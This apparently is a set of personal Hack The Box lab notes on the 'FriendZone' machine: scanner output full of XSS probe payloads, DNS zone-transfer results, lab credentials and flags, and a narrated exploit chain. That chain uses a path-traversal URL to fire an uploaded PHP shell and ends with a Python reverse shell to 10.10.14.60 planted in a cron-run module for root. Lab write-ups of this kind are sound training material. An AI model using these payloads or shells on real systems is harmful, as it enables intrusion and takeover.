CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: HEAD, DELETE, GET <br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-7501: /themes/mambosimple.php?detection=detected&amp;sitename=&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-7505: /emailfriend/emailnews.php?id=\&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-7504: /emailfriend/emailfaq.php?id=\&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-7503: /emailfriend/emailarticle.php?id=\&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /administrator/upload.php?newbanner=1&amp;choice=\&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /666%0a%0a&lt;script&gt;alert(&#39;Vulnerable&#39;);&lt;/script&gt;666.jsp: Apache Tomcat 4.1 / Linux is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /servlet/MsgPage?action=test&amp;msg=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: NetDetector 3.0 and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /servlet/org.apache.catalina.ContainerServlet/&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.<br />+ /servlet/org.apache.catalina.Context/&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.<br />+ /servlet/org.apache.catalina.Globals/&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.<br />+ /servlet/org.apache.catalina.servlets.WebdavStatus/&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.<br />+ /servlets/MsgPage?action=badlogin&amp;msg=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: The NetDetector install is vulnerable to Cross Site Scripting (XSS) in its invalid login message. http://www.cert.org/advisories/CA-2000-02.html.<br />+ /admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&amp;URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&amp;ReturnURL=\&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: IIS 6 on Windows 2003 is vulnerable to Cross Site Scripting (XSS) in certain error messages. http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-17666: /_mem_bin/formslogin.asp?\&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Site Server is vulnerable to Cross Site Scripting<br />+ OSVDB-3624: /webcalendar/week.php?eventinfo=&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-41361: /templates/form_header.php?noticemsg=&lt;script&gt;javascript:alert(document.cookie)&lt;/script&gt;: MyMarket 1.71 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-9238: /supporter/index.php?t=updateticketlog&amp;id=&amp;lt;script&amp;gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;&amp;lt;/script&amp;gt;: MyHelpdesk from http://myhelpdesk.sourceforge.net/ versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-9238: /supporter/index.php?t=tickettime&amp;id=&amp;lt;script&amp;gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;&amp;lt;/script&amp;gt;: MyHelpdesk from http://myhelpdesk.sourceforge.net/ versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-9238: /supporter/index.php?t=ticketfiles&amp;id=&amp;lt;script&amp;gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;&amp;lt;/script&amp;gt;: MyHelpdesk from http://myhelpdesk.sourceforge.net/ versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-2689: /servlet/ContentServer?pagename=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Open Market Inc. ContentServer is vulnerable to Cross Site Scripting (XSS) in the login-error page. http://www.cert.org/advisories/CA-2000-02.html.<br />+ /samples/search.dll?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;logic=AND: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /postnuke/modules.php?op=modload&amp;name=Web_Links&amp;file=index&amp;req=viewlinkdetails&amp;lid=666&amp;ttitle=Mocosoft+Utilities\&quot;%3&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Postnuke Phoenix 0.7.2.3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /phpwebsite/index.php?module=search&amp;SEA_search_op=continue&amp;PDA_limit=10\&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /phpwebsite/index.php?module=pagemaster&amp;PAGE_user_op=view_page&amp;PAGE_id=10\&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;&amp;MMN_position=[X:X]: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /phpwebsite/index.php?module=fatcat&amp;fatcat[user]=viewCategory&amp;fatcat_id=1%00+\&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /phpwebsite/index.php?module=calendar&amp;calendar[view]=day&amp;month=2&amp;year=2003&amp;day=1+%00\&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-2193: /phpBB/viewtopic.php?topic_id=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: phpBB is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-4297: /phpBB/viewtopic.php?t=17071&amp;highlight=\&quot;&gt;\&quot;&lt;script&gt;javascript:alert(document.cookie)&lt;/script&gt;: phpBB is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /Page/1,10966,,00.html?var=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Vignette server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html. Upgrade to the latest version.<br />+ /node/view/666\&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;: Drupal 4.2.0 RC is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-5106: /netutils/whodata.stm?sitename=&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /nav/cList.php?root=&lt;/script&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)/&lt;script&gt;: RaQ3 server script is vulnerable to Cross Site Scripting (XSS).  http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-3201: /megabook/admin.cgi?login=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Megabook guestbook is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /mailman/listinfo/&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Mailman is vulnerable <br />to Cross Site Scripting (XSS). Upgrade to version 2.0.8 to fix. http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-5803: /isapi/testisa.dll?check1=&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /html/partner.php?mainfile=anything&amp;Default_Theme=&#39;&lt;script&gt;alert(document.cookie);&lt;/script&gt;: myphpnuke version 1.8.8_final_7 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /html/chatheader.php?mainfile=anything&amp;Default_Theme=&#39;&lt;script&gt;alert(document.cookie);&lt;/script&gt;: myphpnuke version 1.8.8_final_7 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-2322: /gallery/search.php?searchstring=&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.securityfocus.com/bid/8288.<br />+ OSVDB-31694: /forums/index.php?board=;action=login2&amp;user=USERNAME&amp;cookielength=120&amp;passwrd=PASSWORD&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: YaBB is vulnerable to Cross Site Scripting (XSS) in the password field of the login page. http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-9231: /error/500error.jsp?et=1&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;;: Macromedia Sitespring 1.2.0(277.1) on Windows 2000 is vulnerable to Cross Site Scripting (XSS) in the error pages. http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-50619: /cleartrust/ct_logon.asp?CTLoginErrorMsg=&lt;script&gt;alert(1)&lt;/script&gt;: RSA ClearTrust allows Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-27095: /bb000001.pl&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-2243: /addressbook/index.php?surname=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Phpgroupware 0.9.14.003 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-2243: /addressbook/index.php?name=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Phpgroupware 0.9.14.003 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;.thtml: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;.shtml: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;.jsp: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ /&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;.aspx: Cross site scripting (XSS) is allowed with .aspx file requests (may be Microsoft .net). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-6662: /&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-700: /fcgi-bin/echo?foo=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-3954: /fcgi-bin/echo2?foo=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-700: /fcgi-bin/echo.exe?foo=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-3954: /fcgi-bin/echo2.exe?foo=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br />+ OSVDB-12606: /bugs/index.php?err=3&amp;email=\&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: MySQL Eventum is vulnerable to XSS in the email field.<br />+ OSVDB-12607: /bugs/forgot_password.php?email=\&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;: MySQL Eventum is vulnerable to XSS in the email field.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>    user<br />    04d18bc79dac1d4d48ee0a940c8eb929<br />    root<br />    3f5f727c38d9f70e1d2ad2ba11059d92</div><div class='page'><h1 class='title level-4'>10.10.10.123 FriendZone</h1><br/><br /></div><div class='page'><h1 class='title level-5'>Enumeration</h1><br/>S-1-22-1-1000 Unix User\friend <br />S-1-5-21-3651157261-4258463691-276428382-501 FRIENDZONE\nobody (Local User)<br /><br />	WORKGROUP            HARIS-PC<br /><br />admin:WORKWORKHhallelujah@#<br /><br />can write to \\10.10.10.123\Development<br /><br />friendzone.red<br /><br /><br />db_user=friend<br /><br />db_pass=Agpyu12!0.213$<br /><br />pspy shows you a cron<br /><a href="Machines--HTB--1-99--10.10.10.29_Bank--LinEnum.html">LinEnum</a> will show you that /opt/xxx/os.py is world writable<br />add some code into that to give yourself a reverse shell</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.123<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-23 08:51 EST<br />Nmap scan report for 10.10.10.123<br />Host is up (0.084s latency).<br />Not shown: 993 closed ports<br />PORT    STATE SERVICE<br />21/tcp  open  ftp<br />22/tcp  open  ssh<br />53/tcp  open  domain<br />80/tcp  open  http<br />139/tcp open  netbios-ssn<br />443/tcp open  https<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds</div><div class='page'><h1 class='title level-6'>nmap Long</h1><br/>nmap -sC -sV -p- 10.10.10.123<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-23 08:53 EST<br />Nmap scan report for 10.10.10.123<br />Host is up (0.083s latency).<br />Not shown: 65528 closed ports<br />PORT    STATE SERVICE     VERSION<br />21/tcp  open  ftp         vsftpd 3.0.3<br />22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)<br />|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)<br />|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)<br />53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)<br />| dns-nsid: <br />|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu<br />80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Friend Zone Escape software<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />443/tcp open  ssl/http    Apache httpd 2.4.29<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: 404 Not Found<br />| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO<br />| Not valid before: 2018-10-05T21:02:30<br />|_Not valid after:  2018-11-04T21:02:30<br />|_ssl-date: TLS randomness does not represent time<br />| tls-alpn: <br />|   http/1.1<br /><br />|_  http/1.1<br />445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br />Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: -39m33s, deviation: 1h09m16s, median: 25s<br />|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br />|   Computer name: friendzone<br />|   NetBIOS computer name: FRIENDZONE\x00<br />|   Domain name: \x00<br />|   FQDN: friendzone<br />|_  System time: 2019-12-23T15:56:32+02:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-12-23 08:56:31<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 215.68 seconds<br />root@kali:~/Desktop/Machines/HTB/FriendZone# <br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u http://10.10.10.123:80 --simple-report dirsearchsimple_10.10.10.123:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-12-23_08-53-20.log<br /><br />Target: http://10.10.10.123:80<br /><br />[08:53:20] Starting: <br />[08:53:22] 403 -  293B  - /icons/<br />[08:53:24] 403 -  291B  - /.php<br />[08:53:27] 200 -  747B  - /wordpress/<br />[09:07:13] 403 -  301B  - /server-status/<br /><br />Task Completed<br />root@kali:~/Desktop/Machines/HTB/FriendZone# <br /><br /><br /><br /><br /><br />Target: <a href="https://admin.friendzoneportal.red:443">https://admin.friendzoneportal.red:443</a><br /><br />[10:53:35] Starting: <br />[10:53:35] 403 -  306B  - /.php<br />[10:53:36] 200 -    7B  - /login.php<br />[10:53:36] 403 -  308B  - /icons/<br />[11:09:43] 403 -  316B  - /server-status/<br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.10.10.123:80">http://10.10.10.123:80</a> | tee nikto_10.10.10.123:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.123<br />+ Target Hostname:    10.10.10.123<br />+ Target Port:        80<br />+ Start Time:         2019-12-23 08:53:18 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.29 (Ubuntu)<br />+ Server leaks inodes via ETags, header found with file /, fields: 0x144 0x577831e9005e6 <br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ OSVDB-3268: /wordpress/: Directory indexing found.<br />+ 7499 requests: 0 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2019-12-23 09:04:15 (GMT-5) (657 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /><br /><br />      *********************************************************************<br />      Portions of the server&#39;s headers (Apache/2.4.29) are not in<br />      the Nikto database or are newer than the known string. Would you like<br />      to submit this information (*no server specific data*) to CIRT.net<br />      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? <br /></div><div class='page'><h1 class='title level-6'>dig</h1><br/>; &lt;&lt;&gt;&gt; DiG 9.11.4-2-Debian &lt;&lt;&gt;&gt; axft @10.10.10.123<br />;; global options: +cmd<br />;; Got answer:<br />;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: REFUSED, id: 51013<br />;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1<br />;; WARNING: recursion requested but not available<br /><br />;; OPT PSEUDOSECTION:<br />; EDNS: version: 0, flags:; udp: 4096<br />; COOKIE: d2024edb8759a97f7def72ff5e00cebee4a48e749acace12 (good)<br />;; QUESTION SECTION:<br />;axft.				IN	A<br /><br />;; Query time: 85 msec<br />;; SERVER: 10.10.10.123#53(10.10.10.123)<br />;; WHEN: Mon Dec 23 09:26:43 EST 2019<br />;; MSG SIZE  rcvd: 61<br /><br />root@kali:~/Desktop/Machines/HTB/FriendZone# dig axfr friendzone.red @10.10.10.123<br /><br />; &lt;&lt;&gt;&gt; DiG 9.11.4-2-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123<br />;; global options: +cmd<br />friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800<br />friendzone.red.		604800	IN	AAAA	::1<br />friendzone.red.		604800	IN	NS	localhost.<br />friendzone.red.		604800	IN	A	127.0.0.1<br />administrator1.friendzone.red. 604800 IN A	127.0.0.1<br />hr.friendzone.red.	604800	IN	A	127.0.0.1<br />uploads.friendzone.red.	604800	IN	A	127.0.0.1<br />friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800<br />;; Query time: 81 msec<br />;; SERVER: 10.10.10.123#53(10.10.10.123)<br />;; WHEN: Mon Dec 23 09:49:42 EST 2019<br />;; XFR size: 8 records (messages 1, bytes 289)<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />    a9ed20acecd6c5b6b52f474e15ae9a11<br />root<br />    </div><div class='page'><h1 class='title level-4'>10.10.10.123 Friendzone2</h1><br/>nmap showed that 21, 22, 53, 80, 139, 443, and 445 were open.<br />ftp anonymous was not allowed<br />OpenSSH banner showed 7.6p1 which after some recon revealed that the machine was probably a Ubuntu Bionic 18.04<br /><br />dns recon went wild and after going through initially and then over agian after some hints in the web pages the following got added to the /etc/hosts file<br />10.10.10.123 friendzone.red friendzoneportal.red friendzone admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red<br /><br />While using SquidsSmbTool I found the creds<br />    admin:WORKWORKHhallelujah@#<br /><br />the creds worked on <a href="https://administrator1.friendzone.red">https://administrator1.friendzone.red</a><br />I was able to use the php “filter base64” trick to see the real code, not super helpful but neat trick<br /><br />I was able to put via smb to the /etc/Development file<br /><a href="https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../../../etc/Development/phpshell">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=../../../../../../../../etc/Development/phpshell</a><br />execute ^^ from the webpage and Boom!! reverse shell!!!!<br /><br />While doing initial enumeration while looking throught the /opt/ directory I found a custom python script. I used pspy to determine if it was being called on a cron.<br />It is!!<br />LinEnum.sh showed that /usr/lib/python2.7/os.py is world writeable!!<br />pulled a copy over to the kali machine for easier manipulation.<br />copied over PenTestMonkeys python one liner and put it into code form just like so<br /><br />import socket,subprocess, os<br />s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((&quot;10.10.14.60&quot;,3233))<br />os.dup2(s.fileno(),0)<br />os.dup2(s.fileno(),1)<br />os.dup2(s.fileno(),2)<br />p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br /><br />copied it back over, nc listener... rooted.</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>dns found an entry that needed to be added to /etc/hosts<br /><br /><br />admin:WORKWORKHhallelujah@#<br /><br />cUZVQ2U0emNyWDE1ODYwMjU1NDlBYThpOHNRQVBH<br /><br /><br /><br /><a href="https://administrator1.friendzone.red/dashboard.php?image_id=phpshell1.jpg&pagename=../../../../../etc/Development/phpshell">https://administrator1.friendzone.red/dashboard.php?image_id=phpshell1.jpg&amp;pagename=../../../../../etc/Development/phpshell</a><br /><br /><br /><br />db_user=friend<br />db_pass=Agpyu12!0.213$<br />^^work for ssh!!</div><div class='page'><h1 class='title level-6'>nmap smart</h1><br/></div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/></div><div class='page'><h1 class='title level-8'>web nmap</h1><br/><br />PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br /><br />NSE: Script Post-scanning.<br /></div><div class='page'><h1 class='title level-8'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-8'>nikto</h1><br/>nikto -host <a href="http://10.10.10.123:80">http://10.10.10.123:80</a> | tee nikto_10.10.10.123:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.123<br />+ Target Hostname:    10.10.10.123<br />+ Target Port:        80<br />+ Start Time:         2020-04-04 13:15:08 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.29 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Server may leak inodes via ETags, header found with file /, inode: 144, size: 577831e9005e6, mtime: gzip<br />+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2020-04-04 13:42:33 (GMT-4) (1645 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />squid@CoolHandKali:/Yeet/Machines/HTB/FriendZone$ <br /></div><div class='page'><h1 class='title level-7'>443</h1><br/></div><div class='page'><h1 class='title level-8'>web nmap</h1><br/>PORT    STATE SERVICE  REASON  VERSION<br />443/tcp open  ssl/http syn-ack Apache httpd 2.4.29<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />Service Info: Host: 127.0.0.1<br /><br /></div><div class='page'><h1 class='title level-8'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-8'>nikto</h1><br/>Csquid@CoolHandKali:/Yeet/Machines/HTB/FriendZone$ nikto -host <a href="https://friendzone.red:443">https://friendzone.red:443</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.123<br />+ Target Hostname:    friendzone.red<br />+ Target Port:        443<br />---------------------------------------------------------------------------<br />+ SSL Info:        Subject:  /C=JO/ST=CODERED/L=AMMAN/O=CODERED/OU=CODERED/CN=friendzone.red/emailAddress=haha@friendzone.red<br />                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384<br />                   Issuer:   /C=JO/ST=CODERED/L=AMMAN/O=CODERED/OU=CODERED/CN=friendzone.red/emailAddress=haha@friendzone.red<br />+ Start Time:         2020-04-04 13:55:56 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.29 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect 